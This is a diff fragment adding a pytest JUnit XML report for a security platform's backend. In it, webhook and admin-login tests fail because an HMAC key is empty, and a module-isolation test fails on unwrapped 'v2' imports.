+            "email": os.environ["ADMIN_EMAIL"],
+            "password": os.environ["ADMIN_PASSWORD"]})
+&gt;       assert r.status_code == 200, f"admin login failed: {r.text}"
+               ^^^^^^^^^^^^^^^^^^^^
+E       AssertionError: admin login failed: {"detail":"HMAC key must not be empty.","request_id":"nvx-24c2bdf91798"}
+
+/app/backend/tests/_verified_session.py:37: AssertionError</error></testcase><testcase classname="tests.test_xdr_webhooks" name="test_retries_exhaust_to_dlq" time="0.000"><error message="failed on setup with &quot;AssertionError: admin login failed: {&quot;detail&quot;:&quot;HMAC key must not be empty.&quot;,&quot;request_id&quot;:&quot;nvx-24c2bdf91798&quot;}&quot;">@pytest.fixture(scope="module", autouse=True)
+    def _seed():
+        # ONE client for the whole module, context-managed so the application
+        # lifespan (config validation + database init) is live for every request.
+        # Mixing a lifespan client with a second non-lifespan client puts the two
+        # on different event loops, which surfaces as a `Task ... got Future
+        # attached to a different loop` 500 rather than as a test failure.
+        global client
+        with TestClient(app) as c:
+            client = c
+&gt;           _TOKEN.append(admin_token(c))
+                          ^^^^^^^^^^^^^^
+
+tests/test_xdr_webhooks.py:61: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+client = &lt;starlette.testclient.TestClient object at 0xfbf43e527f10&gt;
+
+    def admin_token(client: TestClient) -&gt; str:
+        """Log the seeded platform administrator in and return its JWT."""
+        r = client.post("/api/auth/login", json={
+            "email": os.environ["ADMIN_EMAIL"],
+            "password": os.environ["ADMIN_PASSWORD"]})
+&gt;       assert r.status_code == 200, f"admin login failed: {r.text}"
+               ^^^^^^^^^^^^^^^^^^^^
+E       AssertionError: admin login failed: {"detail":"HMAC key must not be empty.","request_id":"nvx-24c2bdf91798"}
+
+/app/backend/tests/_verified_session.py:37: AssertionError</error></testcase><testcase classname="tests.test_xdr_webhooks" name="test_replay_dlq_delivery" time="0.000"><error message="failed on setup with &quot;AssertionError: admin login failed: {&quot;detail&quot;:&quot;HMAC key must not be empty.&quot;,&quot;request_id&quot;:&quot;nvx-24c2bdf91798&quot;}&quot;">@pytest.fixture(scope="module", autouse=True)
+    def _seed():
+        # ONE client for the whole module, context-managed so the application
+        # lifespan (config validation + database init) is live for every request.
+        # Mixing a lifespan client with a second non-lifespan client puts the two
+        # on different event loops, which surfaces as a `Task ... got Future
+        # attached to a different loop` 500 rather than as a test failure.
+        global client
+        with TestClient(app) as c:
+            client = c
+&gt;           _TOKEN.append(admin_token(c))
+                          ^^^^^^^^^^^^^^
+
+tests/test_xdr_webhooks.py:61: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+client = &lt;starlette.testclient.TestClient object at 0xfbf43e527f10&gt;
+
+    def admin_token(client: TestClient) -&gt; str:
+        """Log the seeded platform administrator in and return its JWT."""
+        r = client.post("/api/auth/login", json={
+            "email": os.environ["ADMIN_EMAIL"],
+            "password": os.environ["ADMIN_PASSWORD"]})
+&gt;       assert r.status_code == 200, f"admin login failed: {r.text}"
+               ^^^^^^^^^^^^^^^^^^^^
+E       AssertionError: admin login failed: {"detail":"HMAC key must not be empty.","request_id":"nvx-24c2bdf91798"}
+
+/app/backend/tests/_verified_session.py:37: AssertionError</error></testcase><testcase classname="tests.test_xdr_webhooks" name="test_rotate_secret_produces_new_plaintext" time="0.000"><error message="failed on setup with &quot;AssertionError: admin login failed: {&quot;detail&quot;:&quot;HMAC key must not be empty.&quot;,&quot;request_id&quot;:&quot;nvx-24c2bdf91798&quot;}&quot;">@pytest.fixture(scope="module", autouse=True)
+    def _seed():
+        # ONE client for the whole module, context-managed so the application
+        # lifespan (config validation + database init) is live for every request.
+        # Mixing a lifespan client with a second non-lifespan client puts the two
+        # on different event loops, which surfaces as a `Task ... got Future
+        # attached to a different loop` 500 rather than as a test failure.
+        global client
+        with TestClient(app) as c:
+            client = c
+&gt;           _TOKEN.append(admin_token(c))
+                          ^^^^^^^^^^^^^^
+
+tests/test_xdr_webhooks.py:61: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+client = &lt;starlette.testclient.TestClient object at 0xfbf43e527f10&gt;
+
+    def admin_token(client: TestClient) -&gt; str:
+        """Log the seeded platform administrator in and return its JWT."""
+        r = client.post("/api/auth/login", json={
+            "email": os.environ["ADMIN_EMAIL"],
+            "password": os.environ["ADMIN_PASSWORD"]})
+&gt;       assert r.status_code == 200, f"admin login failed: {r.text}"
+               ^^^^^^^^^^^^^^^^^^^^
+E       AssertionError: admin login failed: {"detail":"HMAC key must not be empty.","request_id":"nvx-24c2bdf91798"}
+
+/app/backend/tests/_verified_session.py:37: AssertionError</error></testcase><testcase classname="tests.test_xdr_webhooks" name="test_disabled_webhook_refuses_delivery" time="0.000"><error message="failed on setup with &quot;AssertionError: admin login failed: {&quot;detail&quot;:&quot;HMAC key must not be empty.&quot;,&quot;request_id&quot;:&quot;nvx-24c2bdf91798&quot;}&quot;">@pytest.fixture(scope="module", autouse=True)
+    def _seed():
+        # ONE client for the whole module, context-managed so the application
+        # lifespan (config validation + database init) is live for every request.
+        # Mixing a lifespan client with a second non-lifespan client puts the two
+        # on different event loops, which surfaces as a `Task ... got Future
+        # attached to a different loop` 500 rather than as a test failure.
+        global client
+        with TestClient(app) as c:
+            client = c
+&gt;           _TOKEN.append(admin_token(c))
+                          ^^^^^^^^^^^^^^
+
+tests/test_xdr_webhooks.py:61: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+client = &lt;starlette.testclient.TestClient object at 0xfbf43e527f10&gt;
+
+    def admin_token(client: TestClient) -&gt; str:
+        """Log the seeded platform administrator in and return its JWT."""
+        r = client.post("/api/auth/login", json={
+            "email": os.environ["ADMIN_EMAIL"],
+            "password": os.environ["ADMIN_PASSWORD"]})
+&gt;       assert r.status_code == 200, f"admin login failed: {r.text}"
+               ^^^^^^^^^^^^^^^^^^^^
+E       AssertionError: admin login failed: {"detail":"HMAC key must not be empty.","request_id":"nvx-24c2bdf91798"}
+
+/app/backend/tests/_verified_session.py:37: AssertionError</error></testcase><testcase classname="tests.test_xdr_webhooks" name="test_tenant_isolation" time="0.000"><error message="failed on setup with &quot;AssertionError: admin login failed: {&quot;detail&quot;:&quot;HMAC key must not be empty.&quot;,&quot;request_id&quot;:&quot;nvx-24c2bdf91798&quot;}&quot;">@pytest.fixture(scope="module", autouse=True)
+    def _seed():
+        # ONE client for the whole module, context-managed so the application
+        # lifespan (config validation + database init) is live for every request.
+        # Mixing a lifespan client with a second non-lifespan client puts the two
+        # on different event loops, which surfaces as a `Task ... got Future
+        # attached to a different loop` 500 rather than as a test failure.
+        global client
+        with TestClient(app) as c:
+            client = c
+&gt;           _TOKEN.append(admin_token(c))
+                          ^^^^^^^^^^^^^^
+
+tests/test_xdr_webhooks.py:61: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+client = &lt;starlette.testclient.TestClient object at 0xfbf43e527f10&gt;
+
+    def admin_token(client: TestClient) -&gt; str:
+        """Log the seeded platform administrator in and return its JWT."""
+        r = client.post("/api/auth/login", json={
+            "email": os.environ["ADMIN_EMAIL"],
+            "password": os.environ["ADMIN_PASSWORD"]})
+&gt;       assert r.status_code == 200, f"admin login failed: {r.text}"
+               ^^^^^^^^^^^^^^^^^^^^
+E       AssertionError: admin login failed: {"detail":"HMAC key must not be empty.","request_id":"nvx-24c2bdf91798"}
+
+/app/backend/tests/_verified_session.py:37: AssertionError</error></testcase><testcase classname="tests.test_xdr_webhooks" name="test_audit_chain_valid_across_webhook_lifecycle" time="0.000"><error message="failed on setup with &quot;AssertionError: admin login failed: {&quot;detail&quot;:&quot;HMAC key must not be empty.&quot;,&quot;request_id&quot;:&quot;nvx-24c2bdf91798&quot;}&quot;">@pytest.fixture(scope="module", autouse=True)
+    def _seed():
+        # ONE client for the whole module, context-managed so the application
+        # lifespan (config validation + database init) is live for every request.
+        # Mixing a lifespan client with a second non-lifespan client puts the two
+        # on different event loops, which surfaces as a `Task ... got Future
+        # attached to a different loop` 500 rather than as a test failure.
+        global client
+        with TestClient(app) as c:
+            client = c
+&gt;           _TOKEN.append(admin_token(c))
+                          ^^^^^^^^^^^^^^
+
+tests/test_xdr_webhooks.py:61: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+client = &lt;starlette.testclient.TestClient object at 0xfbf43e527f10&gt;
+
+    def admin_token(client: TestClient) -&gt; str:
+        """Log the seeded platform administrator in and return its JWT."""
+        r = client.post("/api/auth/login", json={
+            "email": os.environ["ADMIN_EMAIL"],
+            "password": os.environ["ADMIN_PASSWORD"]})
+&gt;       assert r.status_code == 200, f"admin login failed: {r.text}"
+               ^^^^^^^^^^^^^^^^^^^^
+E       AssertionError: admin login failed: {"detail":"HMAC key must not be empty.","request_id":"nvx-24c2bdf91798"}
+
+/app/backend/tests/_verified_session.py:37: AssertionError</error></testcase><testcase classname="tests.test_v2_isolation" name="test_rc5_source_never_imports_v2_unwrapped" time="5.053"><failure message="AssertionError: RC5 files import v2 outside a try/except block — this breaks the deletion-safety contract: ['scripts/v160_baseline_metrics.py: from v2.investigation.pipeline import investigate', 'scripts/decode_trace_report.py: from v2.investigation.pipeline import investigate, _atomic_ioc_kind', 'scripts/wave_b_foundation_measure.py: from v2.ingestion.canonical import HASH_OBSERVED', 'scripts/wave_b_foundation_measure.py: from v2.ingestion.telemetry_bridge import observation_doc', 'services/decoder/powershell_constants.py: from v2.semantic.ps_ast import tokenize, Token, TOK_OPERATOR, TOK_EOF, TOK_STRING, TOK_NUMBER, TOK_VARIABLE, TOK_TYPECAST, TOK_IDENT', 'canonical/iue/adapters/language_multi_artefact.py: from v2.investigation.iu.engine import classify', 'routers/report_writer.py: from v2.report_writer import build_report, render_markdown', 'routers/decoded_artifacts.py: from v2.decoded_artifacts import get_artifact, list_recent, stats', 'routers/auto_investigate_jobs.py: from v2.jobs import pubsub, store', 'routers/auto_investigate_jobs.py: from v2.jobs.pipeline import run_investigation_with_progress, MAX_INCIDENT_BYTES', 'routers/xdr_ingest.py: from v2.ingestion.telemetry_bridge import link_observations_to_incident, persist_live_observation', 'routers/auto_investigate.py: from v2.jobs.pipeline import run_investigation_with_progress', 'edr_trajectory/platform_seed.py: from v2.ingestion.telemetry_bridge import observation_doc', 'edr_trajectory/prodshape.py: from v2.ingestion.telemetry_bridge import observation_doc', 'engine/orchestrator.py: from v2.semantic.ps_recovery import recover_powershell_from_b64', 'edr_plane/file_identity.py: from v2.ingestion.canonical import HASH_NOT_APPLICABLE, HASH_NOT_OBSERVED, HASH_OBSERVED', 'edr_plane/canonical_bridge.py: from v2.case_engine.schema import COLLECTIONS', 'edr_plane/canonical_bridge.py: from v2.ingestion.telemetry_bridge import persist_live_observation', 'edr_plane/file_content_acquisition.py: from v2.ingestion.canonical import HASH_NOT_OBSERVED, HASH_OBSERVED', 'edr_plane/windows_eventlog.py: from v2.ingestion.canonical import SYSMON_KIND, WINSEC_KIND', 'security_state/tests/phase5_shadow_tests.py: from v2.investigation.builder import build_investigation', 'security_state/tests/phase5_shadow_tests.py: from v2.investigation.shadow_hook import maybe_dispatch_security_state_shadow', 'security_state/tests/phase2c_real_replay_runner.py: from v2.investigation.iu import classify', 'security_state/tests/phase2c_real_replay_runner.py: from v2.investigation.cre import reconstruct', 'security_state/tests/phase2c_real_replay_runner.py: from v2.investigation.intent import assess', 'security_state/tests/phase6b_causal_rules_tests.py: from v2.investigation.builder import build_investigation', 'security_state/tests/phase6b_causal_rules_tests.py: from v2.investigation.shadow_hook import maybe_dispatch_security_state_shadow']&#10;assert not ['scripts/v160_baseline_metrics.py: from v2.investigation.pipeline import investigate', 'scripts/decode_trace_report.p... TOK_IDENT', 'canonical/iue/adapters/language_multi_artefact.py: from v2.investigation.iu.engine import classify', ...]">def test_rc5_source_never_imports_v2_unwrapped():
+        """No RC5 source file may import from v2 outside a try/except.
+        server.py IS allowed to include v2 routers via a try-wrapped
+        import (that's the deletion-safety pattern)."""
+        offenders: list[str] = []
+        for py in BACKEND.rglob("*.py"):
+            rel = py.relative_to(BACKEND)
+            s = str(rel)
+            # Skip anything under v2/ or under tests/ — those are v2 or
+            # test files respectively.
+            if s.startswith("v2/") or s.startswith("tests/"):
+                continue
+            imports = _v2_imports_in(py)
+            if not imports:
+                continue
+            wrapped = _try_wrapped_imports(py)
+            # Any v2 import not covered by a try-block is a violation.
+            raw_wrapped = {"v2", "v2.routers", "v2.flags"} | wrapped
+            for imp in imports:
+                # imp looks like "from v2.routers import ..." or "import v2.foo"
+                mod = imp.split()[1] if imp.startswith("from") else imp.split()[1]
+                if mod not in wrapped and not any(mod.startswith(w) for w in raw_wrapped if w != "v2"):
+                    # Special case: server.py's v2 include is in a try block,
+                    # so the AST walk finds it in `wrapped`.
+                    if mod in wrapped:
+                        continue
+                    offenders.append(f"{rel}: {imp}")
+    
+&gt;       assert not offenders, (
+            "RC5 files import v2 outside a try/except block — this breaks "
+            f"the deletion-safety contract: {offenders}"
+        )
+E       AssertionError: RC5 files import v2 outside a try/except block — this breaks the deletion-safety contract: ['scripts/v160_baseline_metrics.py: from v2.investigation.pipeline import investigate', 'scripts/decode_trace_report.py: from v2.investigation.pipeline import investigate, _atomic_ioc_kind', 'scripts/wave_b_foundation_measure.py: from v2.ingestion.canonical import HASH_OBSERVED', 'scripts/wave_b_foundation_measure.py: from v2.ingestion.telemetry_bridge import observation_doc', 'services/decoder/powershell_constants.py: from v2.semantic.ps_ast import tokenize, Token, TOK_OPERATOR, TOK_EOF, TOK_STRING, TOK_NUMBER, TOK_VARIABLE, TOK_TYPECAST, TOK_IDENT', 'canonical/iue/adapters/language_multi_artefact.py: from v2.investigation.iu.engine import classify', 'routers/report_writer.py: from v2.report_writer import build_report, render_markdown', 'routers/decoded_artifacts.py: from v2.decoded_artifacts import get_artifact, list_recent, stats', 'routers/auto_investigate_jobs.py: from v2.jobs import pubsub, store', 'routers/auto_investigate_jobs.py: from v2.jobs.pipeline import run_investigation_with_progress, MAX_INCIDENT_BYTES', 'routers/xdr_ingest.py: from v2.ingestion.telemetry_bridge import link_observations_to_incident, persist_live_observation', 'routers/auto_investigate.py: from v2.jobs.pipeline import run_investigation_with_progress', 'edr_trajectory/platform_seed.py: from v2.ingestion.telemetry_bridge import observation_doc', 'edr_trajectory/prodshape.py: from v2.ingestion.telemetry_bridge import observation_doc', 'engine/orchestrator.py: from v2.semantic.ps_recovery import recover_powershell_from_b64', 'edr_plane/file_identity.py: from v2.ingestion.canonical import HASH_NOT_APPLICABLE, HASH_NOT_OBSERVED, HASH_OBSERVED', 'edr_plane/canonical_bridge.py: from v2.case_engine.schema import COLLECTIONS', 'edr_plane/canonical_bridge.py: from v2.ingestion.telemetry_bridge import persist_live_observation', 'edr_plane/file_content_acquisition.py: from v2.ingestion.canonical import HASH_NOT_OBSERVED, HASH_OBSERVED', 'edr_plane/windows_eventlog.py: from v2.ingestion.canonical import SYSMON_KIND, WINSEC_KIND', 'security_state/tests/phase5_shadow_tests.py: from v2.investigation.builder import build_investigation', 'security_state/tests/phase5_shadow_tests.py: from v2.investigation.shadow_hook import maybe_dispatch_security_state_shadow', 'security_state/tests/phase2c_real_replay_runner.py: from v2.investigation.iu import classify', 'security_state/tests/phase2c_real_replay_runner.py: from v2.investigation.cre import reconstruct', 'security_state/tests/phase2c_real_replay_runner.py: from v2.investigation.intent import assess', 'security_state/tests/phase6b_causal_rules_tests.py: from v2.investigation.builder import build_investigation', 'security_state/tests/phase6b_causal_rules_tests.py: from v2.investigation.shadow_hook import maybe_dispatch_security_state_shadow']
+E       assert not ['scripts/v160_baseline_metrics.py: from v2.investigation.pipeline import investigate', 'scripts/decode_trace_report.p... TOK_IDENT', 'canonical/iue/adapters/language_multi_artefact.py: from v2.investigation.iu.engine import classify', ...]
+
+tests/test_v2_isolation.py:93: AssertionError</failure></testcase><testcase classname="tests.test_collector_api_key_auth" name="test_api_key_cannot_impersonate_a_user_principal" time="0.011" /><testcase classname="tests.test_collector_api_key_auth" name="test_jwt_admin_path_still_works" time="0.236"><failure message="AssertionError: {&quot;detail&quot;:&quot;HMAC key must not be empty.&quot;,&quot;request_id&quot;:&quot;nvx-5fe07506b14a&quot;}&#10;assert 500 == 200&#10; +  where 500 = &lt;Response [500 Internal Server Error]&gt;.status_code">client = &lt;starlette.testclient.TestClient object at 0xfcdc4acbc9d0&gt;
+
+    def test_jwt_admin_path_still_works(client):
+        login = client.post("/api/auth/login", json={
+            "email": os.environ["ADMIN_EMAIL"],
+            "password": os.environ["ADMIN_PASSWORD"]})
+&gt;       assert login.status_code == 200, login.text
+E       AssertionError: {"detail":"HMAC key must not be empty.","request_id":"nvx-5fe07506b14a"}
+E       assert 500 == 200
+E        +  where 500 = &lt;Response [500 Internal Server Error]&gt;.status_code
+
+tests/test_collector_api_key_auth.py:271: AssertionError</failure></testcase><testcase classname="tests.test_phase2_1_tenant_isolation" name="test_tenant_isolation_identical_rule_ids_and_lifecycle" time="0.000" /><testcase classname="tests.test_phase2_1_tenant_isolation" name="test_tenant_isolation_deduplication_scope" time="0.001" /><testcase classname="tests.test_phase2_1_tenant_isolation" name="test_tenant_isolation_canonical_evidence_and_binding" time="0.001" /><testcase classname="tests.test_v2_isolation" name="test_deleting_v2_would_not_break_rc5_imports" time="0.733" /><testcase classname="tests.test_v2_isolation" name="test_rebaseline_dry_run_matches_frozen_baseline" time="0.379" /></testsuite></testsuites>
